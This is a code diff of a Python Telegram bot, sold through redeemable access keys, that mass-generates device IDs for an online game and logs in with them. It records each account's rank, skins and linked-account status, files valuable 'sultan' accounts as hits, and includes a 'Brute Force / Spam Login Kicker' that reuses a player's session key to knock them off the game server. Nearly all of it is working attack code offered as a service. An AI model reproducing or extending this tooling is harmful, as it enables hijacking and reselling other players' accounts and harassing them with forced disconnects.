+        lines_left -= take
+    for future in tasks:
+        future.result()
+    queue.put(None)
+    writer.join()
+    executor.shutdown()
+    return target_lines, output_file
+
+# ────────────────────────────────────────────────────────────────
+# 7. SAVE ENGINE
+# ────────────────────────────────────────────────────────────────
+
+HIT_COUNTERS = {
+    'sultan': 0, 'highrank': 0, 'v2l_active': 0, 'v2l_inactive': 0,
+    'akun_tua': 0, 'banned': 0,
+    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0
+}
+COUNTER_LOCK = threading.Lock()
+save_lock = threading.Lock()
+
+active_bf_sessions = {}
+bf_sessions_lock = threading.Lock()
+
+def get_rank_file(rank_category: str) -> str:
+    rank_files = {
+        "warrior": os.path.join(OUTPUT_DIR, FOLDERS["rank_warrior"], "warrior_hits.txt"),
+        "elite": os.path.join(OUTPUT_DIR, FOLDERS["rank_elite"], "elite_hits.txt"),
+        "master": os.path.join(OUTPUT_DIR, FOLDERS["rank_master"], "master_hits.txt"),
+        "gm": os.path.join(OUTPUT_DIR, FOLDERS["rank_gm"], "grandmaster_hits.txt"),
+        "epic": os.path.join(OUTPUT_DIR, FOLDERS["rank_epic"], "epic_hits.txt"),
+        "legend": os.path.join(OUTPUT_DIR, FOLDERS["rank_legend"], "legend_hits.txt"),
+        "mythic": os.path.join(OUTPUT_DIR, FOLDERS["rank_mythic"], "mythic_hits.txt"),
     }
-    
+    return rank_files.get(rank_category)
+
+def is_already_saved(device_id: str, filepath: str) -> bool:
+    if not os.path.exists(filepath): return False
     try:
-        acc, zone, stat = GameLogin(device_id).run()
-        if not acc or not zone:
-            result['error'] = f"Login failed: {stat}"
-            if 'ban' in stat.lower():
-                result['ban_status'] = stat
-            return result
-        
-        result['account_id'] = acc
-        result['zone_id'] = zone
-        
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            return device_id in f.read()
+    except: return False
+
+def format_account_card(device, acc, zone, player_data) -> str:
+    lines = [
+        "═" * 60,
+        f"Device ID    : {device}",
+        f"Account      : {acc} ({zone})",
+        f"Nickname     : {player_data.get('nickname', 'N/A')} (Lv.{player_data.get('level', 'N/A')})",
+        f"Status       : NORMAL",
+        f"Rank         : {player_data.get('current_rank', 'Unranked')}",
+        f"Max Rank     : {player_data.get('highest_rank', 'N/A')}",
+        f"Heroes       : {player_data.get('hero_count', 0)}",
+        f"Skins        : {player_data.get('skin_count', 0)}",
+        f"V2L Status   : {player_data.get('v2l_status', 'N/A')}",
+        f"Created      : {player_data.get('created_at', 'N/A')}",
+        "═" * 60,
+    ]
+    return "\n".join(lines)
+
+def save_account(account_info: dict, player_data: dict, mode="detail"):
+    global HIT_COUNTERS
+    device = account_info.get('Device id', '')
+    acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')
+    ban_stat = player_data.get('ban_status', 'NORMAL')
+    is_banned = 'ban' in str(ban_stat).lower()
+    
+    if is_banned:
+        banned_file = os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt")
+        with save_lock:
+            with open(banned_file, "a", encoding='utf-8') as f:
+                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
+        with COUNTER_LOCK:
+            HIT_COUNTERS['banned'] += 1
+        return
+    
+    nick = player_data.get('nickname', 'N/A')
+    if str(nick).lower() in ("unknown", "guest", ""):
+        return
+    
+    level = player_data.get('level', 'N/A')
+    skin = player_data.get('skin_count', 0)
+    hero = player_data.get('hero_count', 0)
+    v2l = player_data.get('v2l_status', 'N/A')
+    v2l_text = "ACTIVE" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
+               "INACTIVE" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"
+    cur_rank = player_data.get('current_rank', 'Unranked')
+    rank_category = get_rank_category(cur_rank)
+    rank_folder = get_rank_file(rank_category)
+    card_text = format_account_card(device, acc, zone, player_data)
+    
+    with save_lock:
+        all_file = FILES["all_hits_detail"]
+        if not is_already_saved(device, all_file):
+            with open(all_file, "a", encoding='utf-8') as f:
+                f.write(card_text + "\n")
+        raw_file = FILES["raw_devices_detail"]
+        if not is_already_saved(device, raw_file):
+            with open(raw_file, "a", encoding='utf-8') as f:
+                f.write(f"{device}\n")
+        if rank_folder and not is_already_saved(device, rank_folder):
+            with open(rank_folder, "a", encoding='utf-8') as f:
+                f.write(card_text + "\n")
+        if v2l_text == "ACTIVE":
+            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
+            if not is_already_saved(device, v2l_file):
+                with open(v2l_file, "a", encoding='utf-8') as f:
+                    f.write(card_text + "\n")
+            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
+        elif v2l_text == "INACTIVE":
+            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
+            if not is_already_saved(device, v2l_file):
+                with open(v2l_file, "a", encoding='utf-8') as f:
+                    f.write(card_text + "\n")
+            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1
+        if skin >= 200:
+            sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
+            if not is_already_saved(device, sultan_file):
+                with open(sultan_file, "a", encoding='utf-8') as f:
+                    f.write(card_text + "\n")
+            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1
+    
+    with COUNTER_LOCK:
+        if rank_category in HIT_COUNTERS:
+            HIT_COUNTERS[rank_category] += 1
+
+# ────────────────────────────────────────────────────────────────
+# 8. DETAIL CHECK ENGINE
+# ────────────────────────────────────────────────────────────────
+
+def process_detail(device_id: str, account_id: int, zone_id: int) -> Optional[dict]:
+    try:
         with GameConnection(device_id=device_id) as conn:
             if not conn.login_to_login_server():
-                result['error'] = "Failed to connect to login server"
-                return result
+                if 'ban' in conn.ban_status.lower():
+                    save_account(
+                        {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
+                        {'ban_status': conn.ban_status, 'nickname': 'BANNED'}, "detail"
+                    )
+                return None
+            if not conn.get_game_server(): return None
+            if not conn.connect_to_game_server(): return None
             
-            if not conn.get_game_server():
-                result['error'] = "Failed to get game server"
-                return result
-            
-            if not conn.connect_to_game_server():
-                result['error'] = "Failed to connect to game server"
-                return result
-            
-            skin_info = conn.get_skin_role_info(acc, zone)
+            # Fetch all data
+            skin_info = conn.get_skin_role_info(account_id, zone_id)
             ban_stat = conn.check_ban_status()
-            result['ban_status'] = ban_stat
             
             if 'ban' in ban_stat.lower():
-                result['error'] = "Account is banned"
-                return result
+                save_account(
+                    {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
+                    {'ban_status': ban_stat, 'nickname': 'BANNED'}, "detail"
+                )
+                return None
+                
+            v2l = get_v2l_status(conn, account_id, zone_id)
+            result = conn.lookup_player(account_id)
+            role_info = conn.get_role_info(account_id, zone_id)
             
-            v2l = get_v2l_status(conn, acc, zone)
-            result['v2l_status'] = v2l
-            
-            player_info = conn.lookup_player(acc)
-            role_info = conn.get_role_info(acc, zone)
-            
+            # --- FIX START: Robust Player Data Extraction ---
             pd = {}
-            if player_info and isinstance(player_info, dict):
-                if isinstance(player_info.get(0), list) and len(player_info[0]) > 0 and isinstance(player_info[0][0], dict):
-                    pd = player_info[0][0]
-                elif isinstance(player_info.get(0), dict):
-                    pd = player_info[0]
+            if result and isinstance(result, dict):
+                # The API often returns data in a nested structure like: {0: [{...player_data...}]}
+                # We need to check multiple possible structures.
+                if isinstance(result.get(0), list) and len(result[0]) > 0:
+                    if isinstance(result[0][0], dict):
+                        pd = result[0][0]
+                    elif isinstance(result[0][0], SdpStruct):
+                        pd = dict(result[0][0])
+                elif isinstance(result.get(0), dict):
+                    pd = result[0]
+                elif isinstance(result.get(0), SdpStruct):
+                    pd = dict(result[0])
                 else:
-                    pd = player_info
+                    # Fallback to using the result directly
+                    pd = result
             
+            # Ensure pd is a dictionary
+            if not isinstance(pd, dict):
+                pd = {}
+            # --- FIX END ---
+
             skin_info = skin_info if isinstance(skin_info, dict) else {}
             role_info = role_info if isinstance(role_info, dict) else {}
             
-            result['nickname'] = pd.get(2) or skin_info.get(2) or role_info.get(2) or f"Player_{acc}"
-            result['level'] = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
-            result['skin_count'] = skin_info.get(10) if skin_info and skin_info.get(10) is not None else pd.get(83, 0)
-            result['hero_count'] = skin_info.get(9) if skin_info and skin_info.get(9) is not None else \
-                                   role_info.get(9) if role_info and role_info.get(9) is not None else 0
+            # Extract Nickname with multiple fallbacks
+            nick = pd.get(2) or skin_info.get(2) or role_info.get(2)
             
+            # If nickname is still missing or invalid, try to find it in other fields
+            if not nick or str(nick).lower() in ("unknown", "guest", ""):
+                # Sometimes nickname is in a different tag, try to find any string that looks like a name
+                for key, value in pd.items():
+                    if isinstance(value, str) and len(value) > 1 and not value.isdigit():
+                        if value.lower() not in ("unknown", "guest", "null", "none"):
+                            nick = value
+                            break
+            
+            # Final fallback if no valid nickname found
+            if not nick or str(nick).lower() in ("unknown", "guest", ""):
+                # Instead of returning None (which causes the error), we can create a placeholder
+                # or try to use the account ID. But to avoid saving junk, we'll return None only if
+                # we are sure the account is truly empty.
+                # For now, let's check if we have ANY data. If not, return None.
+                if not pd and not skin_info and not role_info:
+                    return None
+                # If we have some data but no nickname, use a generic name
+                nick = f"Player_{account_id}"
+
+            # Extract other stats
+            level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
+            
+            skin_cnt = 0
+            if skin_info and skin_info.get(10) is not None:
+                skin_cnt = skin_info.get(10)
+            elif pd.get(83) is not None:
+                skin_cnt = pd.get(83)
+                
+            hero_cnt = 0
+            if skin_info and skin_info.get(9) is not None:
+                hero_cnt = skin_info.get(9)
+            elif role_info and role_info.get(9) is not None:
+                hero_cnt = role_info.get(9)
+            elif pd.get(9) is not None:
+                hero_cnt = pd.get(9)
+
             cur_rank_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
             max_rank_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0
             
-            result['rank'] = map_rank(cur_rank_val)
-            result['highest_rank'] = map_rank(max_rank_val) if max_rank_val else result['rank']
-            
             created_raw = pd.get(42) or conn.creation_ts
+            created_at = ""
             if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                 try:
                     dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
-                    result['created_at'] = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
+                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                 except:
                     pass
             
-            result['success'] = True
+            player_data = {
+                'nickname': nick, 
+                'level': level, 
+                'skin_count': skin_cnt,
+                'hero_count': hero_cnt, 
+                'current_rank': map_rank(cur_rank_val),
+                'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
+                'ban_status': ban_stat, 
+                'v2l_status': v2l, 
+                'created_at': created_at,
+            }
+            
+            save_account(
+                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
+                player_data, "detail"
+            )
+            return player_data
             
     except Exception as e:
-        result['error'] = str(e)
-    
-    return result
+        # Log the error for debugging if needed
+        # print(f"Error in process_detail: {e}")
+        return None
 
 # ────────────────────────────────────────────────────────────────
-# TELEGRAM BOT HANDLERS
+# 9. BRUTE FORCE / SPAM KICKER
+# ────────────────────────────────────────────────────────────────
+
+def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
+    acc, zone, stat = GameLogin(device_id).run()
+    if not acc or not zone:
+        return None
+    try:
+        conn = GameConnection(device_id=device_id)
+        if not conn.login_to_login_server(): return None
+        if not conn.get_game_server() or not conn.connect_to_game_server(): return None
+        sess_key = conn.session_key
+        gs_host = conn.game_host
+        gs_port = conn.game_port
+        creation_ts = conn.creation_ts
+        skin_info = conn.get_skin_role_info(acc, zone)
+        ban_stat = conn.check_ban_status()
+        conn.cleanup()
+        skin_info = skin_info if isinstance(skin_info, dict) else {}
+        nick = skin_info.get(2) or f"Player_{acc}"
+        level = skin_info.get(3) or 1
+        skin_cnt = skin_info.get(10) if (skin_info and skin_info.get(10) is not None) else 0
+        hero_cnt = skin_info.get(9) if (skin_info and skin_info.get(9) is not None) else 0
+        cur_rank_val = skin_info.get(6, 0) or 0
+        max_rank_val = skin_info.get(15, 0) or cur_rank_val
+        return {
+            'device_id': device_id, 'account_id': acc, 'session_key': sess_key,
+            'zone_id': zone, 'creation_ts': creation_ts,
+            'game_host': gs_host, 'game_port': gs_port, 'gs_info': f"{gs_host}:{gs_port}",
+            'nickname': nick, 'level': level,
+            'rank': map_rank(cur_rank_val),
+            'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
+            'skin_count': skin_cnt, 'hero_count': hero_cnt, 'ban_status': ban_stat,
+        }
+    except:
+        return None
+
+def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
+    t0 = time.time()
+    sock = None
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((profile['game_host'], profile['game_port']))
+        body_struct = SdpStruct({
+            0: profile['account_id'], 1: profile['session_key'],
+            2: profile['zone_id'], 4: CLIENT_VERSION, 13: CHANNEL,
+            15: profile['device_id']
+        }).data
+        pkt = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
+        comp = zstd.compress(pkt)
+        flags = (len(comp) + 4) | (16 << 24)
+        sock.send(flags.to_bytes(4, 'big') + comp)
+        q = b''
+        got_ack = False
+        while len(q) < 4:
+            d = sock.recv(4096)
+            if not d: break
+            q += d
+        if len(q) >= 4:
+            fl = int.from_bytes(q[:4], 'big')
+            sz = fl & 0xFFFFFF
+            while len(q) < sz:
+                d = sock.recv(4096)
+                if not d: break
+                q += d
+            if len(q) >= sz:
+                got_ack = True
+        elapsed_ms = (time.time() - t0) * 1000
+        sock.close()
+        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
+    except socket.timeout:
+        elapsed_ms = (time.time() - t0) * 1000
+        if sock:
+            try: sock.close()
+            except: pass
+        return False, elapsed_ms, "TIMEOUT"
+    except Exception as e:
+        elapsed_ms = (time.time() - t0) * 1000
+        if sock:
+            try: sock.close()
+            except: pass
+        return False, elapsed_ms, str(e)
+
+# ────────────────────────────────────────────────────────────────
+# 10. CONVERSATION STATES
+# ────────────────────────────────────────────────────────────────
+
+(
+    STATE_BF_CUSTOM_LOOPS,
+    STATE_BF_CUSTOM_DELAY,
+    STATE_ADMIN_DELETE_KEY,
+    STATE_ADMIN_REVOKE_USER,
+    STATE_ADMIN_BROADCAST,
+    STATE_ADMIN_ADDUSER_ID,
+) = range(6)
+
+# ────────────────────────────────────────────────────────────────
+# 11. HELPERS
 # ────────────────────────────────────────────────────────────────
 
 def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
 
-def is_authorized(user_id: int) -> bool:
+def escape_html(text: str) -> str:
+    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+def main_menu_keyboard() -> InlineKeyboardMarkup:
+    kb = [
+        [InlineKeyboardButton("🔨 Generate Devices", callback_data="gen_menu"),
+         InlineKeyboardButton("🔍 Single Check", callback_data="single_menu")],
+        [InlineKeyboardButton("📂 Bulk Check ", callback_data="bulk_menu"),
+         InlineKeyboardButton("⚡ BruteForce", callback_data="bf_menu")],
+        [InlineKeyboardButton("📊 Statistics", callback_data="stats"),
+         InlineKeyboardButton("👤 My Profile", callback_data="profile")],
+        [InlineKeyboardButton("ℹ️ Help", callback_data="help"),
+         InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin")]
+    ]
+    return InlineKeyboardMarkup(kb)
+
+def admin_panel_keyboard() -> InlineKeyboardMarkup:
+    kb = [
+        [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
+         InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys")],
+        [InlineKeyboardButton("👥 List Users", callback_data="admin_listusers"),
+         InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey")],
+        [InlineKeyboardButton("🚫 Revoke User", callback_data="admin_revoke"),
+         InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
+        [InlineKeyboardButton("➕ Add User (Manual)", callback_data="admin_adduser"),
+         InlineKeyboardButton("📊 Bot Stats", callback_data="admin_botstats")],
+        [InlineKeyboardButton("📁 My Files", callback_data="files"),
+         InlineKeyboardButton("⚡ BF Limits", callback_data="admin_bf_limits")],
+        [InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")]
+    ]
+    return InlineKeyboardMarkup(kb)
+
+def bf_limits_admin_keyboard() -> InlineKeyboardMarkup:
+    current_limit = get_bf_limit()
+    kb = [
+        [InlineKeyboardButton(f"📊 Global Limit: {current_limit}", callback_data="admin_bf_show")],
+        [InlineKeyboardButton("✏️ Set Global Limit", callback_data="admin_bf_set")],
+        [InlineKeyboardButton("👤 Set User-Specific Limit", callback_data="admin_bf_set_user")],
+        [InlineKeyboardButton("🗑️ Clear All Users BF History", callback_data="admin_bf_clear_all")],
+        [InlineKeyboardButton("🧹 Clear Specific User BF History", callback_data="admin_bf_clear_user")],
+        [InlineKeyboardButton("📋 View BF Usage Stats", callback_data="admin_bf_stats")],
+        [InlineKeyboardButton("🔙 Back to Admin", callback_data="admin")]
+    ]
+    return InlineKeyboardMarkup(kb)
+
+def back_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
+
+# ────────────────────────────────────────────────────────────────
+# 12. COMMAND HANDLERS
+# ────────────────────────────────────────────────────────────────
+
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+    username = user.username or user.first_name or "Unknown"
+    
+    valid, user_data = is_user_authorized(user_id)
+    
     if is_admin(user_id):
-        return True
-    return session_manager.is_authorized(user_id)
-
-# ─── Helper Functions ──────────────────────────────────────────
-
-async def safe_reply(update: Update, text: str, **kwargs):
-    """Safely reply to a message or callback query"""
-    try:
-        if update.callback_query:
-            try:
-                await update.callback_query.edit_message_text(text, **kwargs)
-            except:
-                await update.callback_query.message.reply_text(text, **kwargs)
-        elif update.message:
-            await update.message.reply_text(text, **kwargs)
-        else:
-            logger.warning("No message or callback query to reply to")
-    except TimedOut:
-        logger.warning("Timeout while sending message, retrying...")
-        time.sleep(1)
-        try:
-            if update.callback_query:
-                await update.callback_query.message.reply_text(text, **kwargs)
-            elif update.message:
-                await update.message.reply_text(text, **kwargs)
-        except Exception as e:
-            logger.error(f"Failed to send message after retry: {e}")
-    except Exception as e:
-        logger.error(f"Failed to send message: {e}")
-
-# ─── Start & Help Commands ─────────────────────────────────────
-
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /start command"""
-    try:
-        user = update.effective_user
-        user_id = user.id
-        
-        if is_authorized(user_id):
-            await show_main_menu(update, context)
-        else:
-            welcome_msg = (
-                f"👋 *Welcome to Premium Devid Seker Bot!*\n\n"
-                f"🔐 This bot requires an access key to use.\n"
-                f"📝 Please use /redeem <KEY> to activate your access.\n\n"
-                f"💡 Commands:\n"
-                f"   /start - Show this message\n"
-                f"   /redeem <KEY> - Activate your key\n"
-                f"   /help - Show help information\n"
-                f"   /status - Check your access status\n\n"
-                f"👑 *Created by:* @ZyronDevv"
-            )
-            await safe_reply(update, welcome_msg, parse_mode='Markdown')
-    except Exception as e:
-        logger.error(f"Error in start_command: {e}")
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /help command"""
-    help_text = (
-        "📚 *Premium Devid Seker Bot Help*\n\n"
-        "*Available Commands:*\n"
-        "  /start - Main menu\n"
-        "  /redeem <KEY> - Activate access key\n"
-        "  /status - Check access status\n"
-        "  /help - Show this help\n\n"
-        "*Features:*\n"
-        "✅ Full device check (8-request)\n"
-        "✅ Rank detection & sorting\n"
-        "✅ V2L status detection\n"
-        "✅ Sultan accounts detection\n"
-        "✅ Bulk checking with file upload\n"
-        "✅ Device ID generation\n"
-        "✅ Brute force login kicker with STOP button\n\n"
-        "👑 *Created by:* @ZyronDevv"
-    )
-    await safe_reply(update, help_text, parse_mode='Markdown')
-
-# ─── Main Menu ──────────────────────────────────────────────────
-
-async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show the main menu with buttons"""
-    keyboard = [
-        [InlineKeyboardButton("🔍 Single Check", callback_data="menu_single")],
-        [InlineKeyboardButton("📊 Bulk Check", callback_data="menu_bulk")],
-        [InlineKeyboardButton("🔨 Generate IDs", callback_data="menu_generate")],
-        [InlineKeyboardButton("⚡ Brute Force", callback_data="menu_bruteforce")],
-        [InlineKeyboardButton("📈 Statistics", callback_data="menu_stats")],
-        [InlineKeyboardButton("🔑 Key Management", callback_data="menu_keys")],
-        [InlineKeyboardButton("❓ Help", callback_data="menu_help")],
-    ]
-    
-    try:
-        if update.callback_query:
-            await update.callback_query.edit_message_text(
-                "🏠 *Main Menu*\n\nSelect an option below:",
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        elif update.message:
-            await update.message.reply_text(
-                "🏠 *Main Menu*\n\nSelect an option below:",
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-    except Exception as e:
-        logger.error(f"Error showing main menu: {e}")
-
-# ─── Menu Callback Handler ─────────────────────────────────────
-
-async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle menu button callbacks"""
-    try:
-        query = update.callback_query
-        await query.answer()
-        
-        user_id = update.effective_user.id
-        if not is_authorized(user_id):
-            await query.edit_message_text(
-                "🔒 *Access Denied*\n\nPlease use /redeem <KEY> to activate your access.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        data = query.data
-        
-        if data == "menu_main":
-            await show_main_menu(update, context)
-        
-        elif data == "menu_single":
-            await query.edit_message_text(
-                "🔍 *Single Device Check*\n\nPlease send me the Device ID to check.\n"
-                "Example: `and_abcd1234...`\n\nOr type /cancel to go back.",
-                parse_mode='Markdown'
-            )
-            context.user_data['state'] = AWAITING_DEVICE
-        
-        elif data == "menu_bulk":
-            keyboard = [
-                [InlineKeyboardButton("📤 Upload File", callback_data="bulk_upload")],
-                [InlineKeyboardButton("📋 Use Generated", callback_data="bulk_generated")],
-                [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-            ]
-            await query.edit_message_text(
-                "📊 *Bulk Check*\n\nChoose input source:",
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        
-        elif data == "menu_generate":
-            keyboard = [
-                [InlineKeyboardButton("10 MB", callback_data="gen_10")],
-                [InlineKeyboardButton("50 MB", callback_data="gen_50")],
-                [InlineKeyboardButton("100 MB", callback_data="gen_100")],
-                [InlineKeyboardButton("500 MB", callback_data="gen_500")],
-                [InlineKeyboardButton("Custom", callback_data="gen_custom")],
-                [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-            ]
-            await query.edit_message_text(
-                "🔨 *Generate Device IDs*\n\nSelect size to generate:",
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        
-        elif data.startswith("gen_"):
-            sizes = {"10": 10, "50": 50, "100": 100, "500": 500}
-            size_str = data.replace("gen_", "")
-            if size_str == "custom":
-                await query.edit_message_text(
-                    "📝 *Custom Size*\n\nEnter size in MB:",
-                    parse_mode='Markdown'
-                )
-                context.user_data['state'] = GENERATOR_MENU
-                return
-            
-            size = sizes.get(size_str, 10)
-            await query.edit_message_text(
-                f"⏳ *Generating {size}MB of Device IDs...*\nThis may take a few moments.",
-                parse_mode='Markdown'
-            )
-            
-            try:
-                output_file = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
-                if os.path.exists(output_file):
-                    os.remove(output_file)
-                
-                count = int((size * 1024 * 1024) / 80 * 1.02)
-                generate_devices(count, output_file)
-                
-                if os.path.exists(output_file):
-                    with open(output_file, 'r') as f:
-                        line_count = sum(1 for _ in f)
-                    
-                    keyboard = [
-                        [InlineKeyboardButton("📥 Download", callback_data="download_generated")],
-                        [InlineKeyboardButton("✅ Use for Bulk Check", callback_data="bulk_generated")],
-                        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-                    ]
-                    await query.edit_message_text(
-                        f"✅ *Generation Complete!*\n\n📊 Generated: {line_count:,} devices\n"
-                        f"📦 File size: ~{size}MB\n\nWhat would you like to do?",
-                        reply_markup=InlineKeyboardMarkup(keyboard),
-                        parse_mode='Markdown'
-                    )
-                else:
-                    await query.edit_message_text("❌ *Generation Failed*\n\nPlease try again later.", parse_mode='Markdown')
-            except Exception as e:
-                await query.edit_message_text(f"❌ *Error:* {str(e)}", parse_mode='Markdown')
-        
-        elif data == "download_generated":
-            file_path = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
-            if os.path.exists(file_path):
-                with open(file_path, 'rb') as f:
-                    await query.message.reply_document(
-                        document=InputFile(f, filename="generated_devices.txt"),
-                        caption="📥 Generated Device IDs"
-                    )
-                await query.answer("File sent!")
-            else:
-                await query.answer("File not found!", show_alert=True)
-        
-        elif data == "bulk_upload":
-            await query.edit_message_text(
-                "📤 *Upload File for Bulk Check*\n\nPlease upload a `.txt` file containing device IDs.\n"
-                "One device ID per line.\n\nThe file should be less than 10MB.\n\nOr type /cancel to go back.",
-                parse_mode='Markdown'
-            )
-            context.user_data['state'] = AWAITING_FILE
-        
-        elif data == "bulk_generated":
-            file_path = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
-            if not os.path.exists(file_path):
-                await query.edit_message_text("❌ *No generated file found*\n\nPlease generate devices first.", parse_mode='Markdown')
-                return
-            
-            with open(file_path, 'r') as f:
-                devices = [line.strip() for line in f if line.strip()]
-            
-            if not devices:
-                await query.edit_message_text("❌ *No devices found in file*", parse_mode='Markdown')
-                return
-            
-            context.user_data['bulk_devices'] = devices
-            await start_bulk_check(update, context, query)
-        
-        elif data == "menu_bruteforce":
-            await query.edit_message_text(
-                "⚡ *Brute Force / Spam Login Kicker*\n\n"
-                "Please send me the Device ID to attack.\n"
-                "Example: `and_abcd1234...`\n\n"
-                "⚠️ Use responsibly!\n\n"
-                "You can STOP the attack at any time using the STOP button.\n\n"
-                "Or type /cancel to go back.",
-                parse_mode='Markdown'
-            )
-            context.user_data['state'] = AWAITING_BRUTE_CONFIG
-        
-        elif data == "menu_stats":
-            await show_statistics(update, context, query)
-        
-        elif data == "menu_keys":
-            if is_admin(user_id):
-                await show_key_management(update, context, query)
-            else:
-                await query.edit_message_text(
-                    "🔑 *Your Access Status*\n\n✅ Authorized\n"
-                    f"Key used: {context.user_data.get('used_key', 'Unknown')}\n\nContact admin for key management.",
-                    parse_mode='Markdown'
-                )
-        
-        elif data == "menu_help":
-            await help_command(update, context)
-        
-        # ─── Brute Force Stop Handler ──────────────────────────
-        elif data == "brute_stop":
-            context.user_data['brute_running'] = False
-            await query.edit_message_text(
-                "🛑 *Brute Force Stopped!*\n\n"
-                "The attack has been stopped by user request.\n\n"
-                "Use /start to return to main menu.",
-                parse_mode='Markdown'
-            )
-    
-    except Exception as e:
-        logger.error(f"Error in menu_callback: {e}")
-        try:
-            await update.callback_query.edit_message_text(
-                f"❌ *Error:* {str(e)}",
-                parse_mode='Markdown'
-            )
-        except:
-            pass
-
-# ─── Key Redemption ─────────────────────────────────────────────
-
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /redeem command"""
-    try:
-        user_id = update.effective_user.id
-        
-        if is_authorized(user_id):
-            await safe_reply(update, "✅ *Already Authorized*\n\nYou already have active access.", parse_mode='Markdown')
-            return
-        
-        args = context.args
-        if not args:
-            await safe_reply(
-                update,
-                "🔑 *Redeem Key*\n\nUsage: `/redeem <KEY>`\n\nExample: `/redeem DEVID_A1B2C3D4E5F6`",
-                parse_mode='Markdown'
-            )
-            return
-        
-        key_str = args[0].strip().upper()
-        key = key_manager.validate_key(key_str)
-        
-        if not key:
-            await safe_reply(
-                update,
-                "❌ *Invalid Key*\n\nThe key you provided is invalid, expired, or already used up.\n"
-                "Please contact an administrator for a new key.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        if not key_manager.use_key(key_str, user_id):
-            await safe_reply(
-                update,
-                "❌ *Key Already Used*\n\nThis key has already been used or reached its limit.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        session_manager.authorize(user_id, key)
-        context.user_data['used_key'] = key_str
-        
-        await safe_reply(
-            update,
-            f"✅ *Access Granted!*\n\nKey: `{key_str}`\nWelcome to Premium Devid Seker Bot!\n\nUse /start to begin.",
-            parse_mode='Markdown'
-        )
-    
-    except Exception as e:
-        logger.error(f"Error in redeem_command: {e}")
-        await safe_reply(update, f"❌ *Error:* {str(e)}", parse_mode='Markdown')
-
-# ─── Status Command ────────────────────────────────────────────
-
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check user status"""
-    try:
-        user_id = update.effective_user.id
-        
-        if is_admin(user_id):
-            status_text = "👑 *Admin Access*\n\nYou have full administrative access."
-        elif is_authorized(user_id):
-            status_text = (
-                "✅ *Authorized*\n\n"
-                f"Key: `{context.user_data.get('used_key', 'Unknown')}`\n"
-                "Access expires: 24 hours from last use."
-            )
-        else:
-            status_text = "❌ *Not Authorized*\n\nPlease use /redeem <KEY> to activate your access."
-        
-        await safe_reply(update, status_text, parse_mode='Markdown')
-    
-    except Exception as e:
-        logger.error(f"Error in status_command: {e}")
-
-# ─── Key Management ────────────────────────────────────────────
-
